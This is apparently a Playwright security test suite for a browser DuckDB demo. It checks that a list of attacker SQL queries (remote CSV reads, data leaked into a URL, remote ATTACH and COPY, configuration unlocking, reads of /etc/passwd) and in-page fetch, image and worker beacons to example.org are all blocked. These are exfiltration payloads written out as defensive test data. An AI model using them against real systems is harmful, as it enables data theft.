import { expect, test } from '@playwright/test'
import { openDemo, recordEgress, runSql } from './helpers'

/** Queries an attacker might get a user to paste. Every one must fail without any network request. */
const ATTACKS: [string, string, RegExp][] = [
  ['read a URL', "SELECT * FROM read_csv('https://example.org/leak.csv')", /disabled by configuration/],
  [
    'leak data in a URL via a variable',
    "SET VARIABLE u = 'https://example.org/x?d=' || (SELECT string_agg(customer, ',') FROM (FROM orders LIMIT 5)); SELECT * FROM read_csv(getvariable('u'))",
    /disabled by configuration/,
  ],
  ['attach a remote database', "ATTACH 'https://example.org/x.duckdb' AS x", /disabled by configuration/],
  ['copy results to a URL', "COPY (SELECT * FROM orders LIMIT 5) TO 'https://example.org/up.csv'", /disabled by configuration/],
  ['re-enable external access', 'SET enable_external_access = true', /locked/],
  ['unlock the configuration', 'SET lock_configuration = false', /locked/],
  ['widen allowed directories', "SET allowed_directories = ['https://']", /locked/],
  ['load a remote extension', "INSTALL httpfs FROM 'https://example.org/ext'; LOAD httpfs", /disabled/],
  ['allow unsigned extensions', 'SET allow_unsigned_extensions = true', /locked/],
  ['path traversal', "SELECT * FROM read_csv_auto('/sheetah/../etc/passwd')", /disabled by configuration/],
  ['read outside the sandbox', "SELECT * FROM read_text('/etc/hosts')", /disabled by configuration/],
]

test.describe('sealed engine', () => {
  test('every exfiltration attempt fails with zero outbound requests', async ({ page }) => {
    const egress = recordEgress(page)
    await openDemo(page)
    for (const [name, sql, expected] of ATTACKS) {
      await runSql(page, sql)
      await expect(page.locator('.error-banner'), name).toContainText(expected)
      await page.locator('.error-banner .link-btn').click()
    }
    await runSql(page, 'SELECT city, count(*) FROM orders GROUP BY 1')
    await expect(page.locator('.result-meta')).toContainText('14 rows')
    expect(egress).toEqual([])
  })
})

test.describe('content security policy', () => {
  test('production headers are served', async ({ request }) => {
    const res = await request.get('/')
    const h = res.headers()
    expect(h['content-security-policy']).toContain("connect-src 'self'")
    expect(h['content-security-policy']).not.toContain("'unsafe-eval'")
    expect(h['cross-origin-opener-policy']).toBe('same-origin')
    expect(h['x-content-type-options']).toBe('nosniff')
    expect(h['referrer-policy']).toBe('no-referrer')
  })

  test('the browser blocks other origins even if code tries', async ({ page }) => {
    const egress = recordEgress(page)
    await page.goto('/')
    const r = await page.evaluate(async () => {
      const res: Record<string, string> = {}
      try {
        await fetch('https://example.org/?d=1')
        res.fetch = 'sent'
      } catch {
        res.fetch = 'blocked'
      }
      res.img = await new Promise((ok) => {
        const i = new Image()
        i.onload = () => ok('loaded')
        i.onerror = () => ok('blocked')
        i.src = 'https://example.org/p.gif?d=2'
      })
      res.worker = await new Promise((ok) => {
        const w = new Worker(URL.createObjectURL(new Blob([`fetch('https://example.org/?d=3').then(()=>postMessage('sent'),()=>postMessage('blocked'))`])))
        w.onmessage = (e) => ok(e.data)
        setTimeout(() => ok('timeout'), 4000)
      })
      try {
        new Function('return 1')()
        res.eval = 'allowed'
      } catch {
        res.eval = 'blocked'
      }
      return res
    })
    expect(r).toEqual({ fetch: 'blocked', img: 'blocked', worker: 'blocked', eval: 'blocked' })
    expect(egress).toEqual([])
  })
})
